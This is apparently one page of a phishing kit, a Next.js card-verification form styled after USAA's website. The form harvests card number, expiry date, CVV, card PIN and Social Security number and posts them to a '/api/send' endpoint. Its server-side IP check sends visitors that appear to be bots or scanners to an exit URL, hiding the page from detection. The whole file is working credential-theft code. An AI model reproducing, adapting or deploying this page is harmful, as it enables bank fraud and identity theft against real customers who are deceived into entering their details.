import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import valid from "card-validator";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../components/Input";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface CardProps { }

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Required")
    .test("test-number", "Invalid", (value) => valid.number(value).isValid),
  expirationDate: yup
    .string()
    .required("Required")
    .test(
      "test-date",
      "Invalid",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("Required")
    .test("test-cvv", "Required", (value) => valid.cvv(value, [3, 4]).isValid),
  cardPin: yup
    .string()
    .required("Required")
    .test("test-pin", "Invalid`", (val) => !isNaN(Number(val)))
    .min(4, "Invalid")
    .max(5, "Invalid"),
  ssn: yup.string().required("Required"),
});

export const Card: React.FC<CardProps> = ({ }) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper
      title="Now, let's continue with your card information."
      subTitle="Please Verify Your Card Information"
      loading={loading}
      isValid={isValid}
      onSubmit={onSubmit}
      errors={errors}
    >
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <Input
            label={`Card Number`}
            name={`cardNumber`}
            register={register}
            registerOptions={{
              onChange: (event: any) => {
                var value = event.target.value;

                var newState = "9999 9999 9999 9999";
                if (/^3[47]/.test(value)) {
                  newState = "9999 999999 99999";
                }
                setCardMask(newState);
              },
            }}
            mask={cardMask}
            error={
              errors.cardNumber &&
              (errors.cardNumber.message as unknown as string)
            }
          />

          <Input
            label={`Expiration Date`}
            name={`expirationDate`}
            register={register}
            mask={`99/9999`}
            error={
              errors.expirationDate &&
              (errors.expirationDate.message as unknown as string)
            }
          />

          <Input
            label={`CVV`}
            name={`cvv`}
            register={register}
            maxLength={4}
            error={errors.cvv && (errors.cvv.message as unknown as string)}
            type="number"
          />

          <Input
            label={`PIN`}
            name={`cardPin`}
            register={register}
            maxLength={5}
            error={
              errors.cardPin && (errors.cardPin.message as unknown as string)
            }
            type="number"
          />

          <Input
            label={`Social Security Number or Tax ID`}
            name={`ssn`}
            register={register}
            error={errors.ssn && (errors.ssn.message as unknown as string)}
            mask={`999-99-9999`}
          />
        </div>
      </div>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
        redirect: {
          destination: process.env.NEXT_PUBLIC_EXIT_URL,
          permanent: false,
        },
      }
      : {}),
  };
};

export default Card;
